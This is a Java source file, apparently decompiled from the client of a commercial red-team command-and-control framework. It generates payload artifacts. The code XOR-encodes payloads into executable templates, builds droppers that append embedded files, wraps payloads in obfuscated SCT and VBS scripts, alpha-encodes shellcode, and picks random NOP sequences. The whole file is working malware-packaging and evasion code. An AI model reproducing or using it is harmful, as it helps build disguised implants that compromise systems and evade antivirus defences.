package common;

import aggressor.AggressorClient;
import encoders.NetBIOS;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;
import java.util.Stack;

import pe.PEEditor;
import sleep.runtime.Scalar;
import sleep.runtime.SleepUtils;

public class BaseArtifactUtils {

    protected AggressorClient client;

    public BaseArtifactUtils(AggressorClient aggressorClient) {
        this.client = aggressorClient;
    }

    public void setupDropper(byte[] arrby, String string1, String string2, String string3) {
        CommonUtils.writeToFile(new File(string3), _setupDropper(arrby, string1, string2));
    }

    public byte[] _setupDropper(byte[] arrby, String string1, String string2) {
        Stack<Scalar> stack = new Stack();
        stack.push(SleepUtils.getScalar(string2));
        stack.push(SleepUtils.getScalar(string1));
        stack.push(SleepUtils.getScalar(arrby));
        String str = client.getScriptEngine().format("DROPPER_ARTIFACT_GENERATOR", stack);
        if (str == null) {
            return fixChecksum(__setupDropper(arrby, string1, string2));
        }
        return fixChecksum(CommonUtils.toBytes(str));
    }

    public byte[] fixChecksum(byte[] arrby) {
        if (License.isTrial()) {
            return arrby;
        }
        try {
            PEEditor pEEditor = new PEEditor(arrby);
            pEEditor.updateChecksum();
            return pEEditor.getImage();
        } catch (Throwable throwable) {
            MudgeSanity.logException("fixChecksum() failed for " + arrby.length + " byte file. Skipping the checksum update", throwable, false);
            return arrby;
        }
    }

    public byte[] __setupDropper(byte[] arrby, String string1, String string2) {
        byte[] arrby1 = CommonUtils.readFile(string1);
        Packer packer = new Packer();
        packer.little();
        packer.addInteger(string2.length() + 1);
        packer.addInteger(arrby1.length);
        byte[] arrby2 = packer.getBytes();
        String str = CommonUtils.bString(arrby);
        int i = str.indexOf("DROPPER!");
        str = CommonUtils.replaceAt(str, CommonUtils.bString(arrby2), i);
        str = str + string2 + Character.MIN_VALUE;
        str = str + CommonUtils.bString(arrby1);
        return CommonUtils.toBytes(str);
    }

    public byte[] patchArtifact(byte[] arrby, String string) {
        Stack stack = new Stack();
        stack.push(SleepUtils.getScalar(arrby));
        stack.push(SleepUtils.getScalar(string));
        String str = client.getScriptEngine()
                .format("EXECUTABLE_ARTIFACT_GENERATOR", stack);
        if (str == null) {
            return fixChecksum(_patchArtifact(arrby, string));
        }
        return fixChecksum(CommonUtils.toBytes(str));
    }

    public byte[] _patchArtifact(byte[] arrby, String string) {
        try {
            InputStream inputStream = CommonUtils.resource("resources/" + string);
            byte[] arrby1 = CommonUtils.readAll(inputStream);
            inputStream.close();
            byte[] arrby2 = new byte[4];
            arrby2[0] = (byte) CommonUtils.rand(254);
            arrby2[1] = (byte) CommonUtils.rand(254);
            arrby2[2] = (byte) CommonUtils.rand(254);
            arrby2[3] = (byte) CommonUtils.rand(254);
            byte[] arrby3 = new byte[arrby.length];
            for (int i = 0; i < arrby.length; i++) {
                arrby3[i] = (byte) (arrby[i] ^ arrby2[i % 4]);
            }
            String str = CommonUtils.bString(arrby1);
            int i = str.indexOf(CommonUtils.repeat("A", 1024));
            Packer packer = new Packer();
            packer.little();
            packer.addInteger(i + 16);
            packer.addInteger(arrby.length);
            packer.addString(arrby2, arrby2.length);
            packer.addString("aaaa", 4);
            packer.addString(arrby3, arrby3.length);
            if (License.isTrial()) {
                packer.addString("X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*");
                CommonUtils.print_trial("Added EICAR string to " + string);
            }
            byte[] arrby4 = packer.getBytes();
            str = CommonUtils.replaceAt(str, CommonUtils.bString(arrby4), i);
            return CommonUtils.toBytes(str);
        } catch (IOException iOException) {
            MudgeSanity.logException("patchArtifact", iOException, false);
            return new byte[0];
        }
    }

    public void patchArtifact(byte[] arrby, String string1, String string2) {
        byte[] artifact = patchArtifact(arrby, string1);
        CommonUtils.writeToFile(new File(string2), artifact);
    }

    public static String escape(byte[] arrby) {
        StringBuffer stringBuffer = new StringBuffer(arrby.length * 10);
        for (int i = 0; i < arrby.length; i++) {
            stringBuffer.append("\\u");
            stringBuffer.append(CommonUtils.toUnicodeEscape(arrby[i]));
        }
        return stringBuffer.toString();
    }

    public byte[] buildSCT(byte[] arrby) {
        String str = CommonUtils.bString(
                CommonUtils.readResource("resources/template.sct")).trim();
        str = CommonUtils.strrep(str, "$$PROGID$$", CommonUtils.garbage("progid"));
        str = CommonUtils.strrep(str, "$$CLASSID$$", CommonUtils.ID());
        str = CommonUtils.strrep(str, "$$CODE$$",
                CommonUtils.bString(new MutantResourceUtils(this.client).buildVBS(arrby)));
        return CommonUtils.toBytes(str);
    }

    public static boolean isLetter(byte by) {
        char c = (char) by;
        return c == '_' || c == ' '
                || c >= 'A' && c <= 'Z'
                || c >= 'a' && c <= 'z'
                || c == '0' || c >= '1' && c <= '9';
    }

    public static String toVBS(byte[] arrby) {
        return toVBS(arrby, 8);
    }

    public static List toChunk(String string, int n) {
        LinkedList<String> linkedList = new LinkedList();
        StringBuffer stringBuffer = new StringBuffer();
        for (int i = 0; i < string.length(); i++) {
            stringBuffer.append(string.charAt(i));
            if (stringBuffer.length() >= n) {
                linkedList.add(stringBuffer.toString());
                stringBuffer = new StringBuffer();
            }
        }
        if (stringBuffer.length() > 0) {
            linkedList.add(stringBuffer.toString());
        }
        return linkedList;
    }

    public static String toVBS(byte[] arrby, int n) {
        LinkedList<String> linkedList = new LinkedList();
        for (int i = 0; i < arrby.length; i++) {
            if (isLetter(arrby[i])) {
                StringBuffer letter = new StringBuffer();
                letter.append("\"");
                letter.append((char) arrby[i]);
                while (i + 1 < arrby.length && isLetter(arrby[i + 1])
                        && letter.length() <= n) {
                    letter.append((char) arrby[i + 1]);
                    i++;
                }
                letter.append("\"");
                linkedList.add(letter.toString());
            } else {
                linkedList.add("Chr(" + arrby[i] + ")");
            }
        }
        StringBuffer stringBuffer = new StringBuffer(arrby.length * 10);
        Iterator iterator = linkedList.iterator();
        int i = 0;
        for (int b = 0; iterator.hasNext(); b++) {
            String str = (String) iterator.next();
            stringBuffer.append(str);
            i += str.toString().length() + 1;
            if (i > 200 && iterator.hasNext()) {
                stringBuffer.append("& _\n");
                i = 0;
                b = 0;
            } else if (b >= 32 && iterator.hasNext()) {
                stringBuffer.append("& _\n");
                i = 0;
                b = 0;
            } else if (iterator.hasNext()) {
                stringBuffer.append("&");
            }
        }
        return stringBuffer.toString();
    }

    public static String toHex(byte[] arrby) {
        StringBuffer stringBuffer = new StringBuffer(arrby.length * 3);
        for (int i = 0; i < arrby.length; i++) {
            int b1 = (arrby[i] & 0xF0) >> 4;
            int b2 = arrby[i] & 0xF;
            stringBuffer.append(Integer.toHexString(b1));
            stringBuffer.append(Integer.toHexString(b2));
        }
        return stringBuffer.toString();
    }

    public static String AlphaEncode(byte[] arrby) {
        AssertUtils.Test((arrby.length > 16384),
                "AlphaEncode used on a stager (or some other small thing)");
        return _AlphaEncode(arrby);
    }

    public static String _AlphaEncode(byte[] arrby) {
        String netbios = CommonUtils.bString(CommonUtils.readResource("resources/netbios.bin"));
        netbios = netbios + "gogo";
        netbios = netbios + NetBIOS.encode('A', arrby);
        return netbios + "aa";
    }

    public static byte[] randomNOP() {
        LinkedList<byte[]> linkedList = new LinkedList();
        linkedList.add(new byte[]{-112});
        linkedList.add(new byte[]{-121, -37});
        linkedList.add(new byte[]{-121, -55});
        linkedList.add(new byte[]{-121, -46});
        linkedList.add(new byte[]{-121, -1});
        linkedList.add(new byte[]{-121, -10});
        linkedList.add(new byte[]{102, -112});
        linkedList.add(new byte[]{102, -121, -37});
        linkedList.add(new byte[]{102, -121, -55});
        linkedList.add(new byte[]{102, -121, -46});
        linkedList.add(new byte[]{102, -121, -1});
        linkedList.add(new byte[]{102, -121, -10});
        return (byte[]) CommonUtils.pick(linkedList);
    }
}
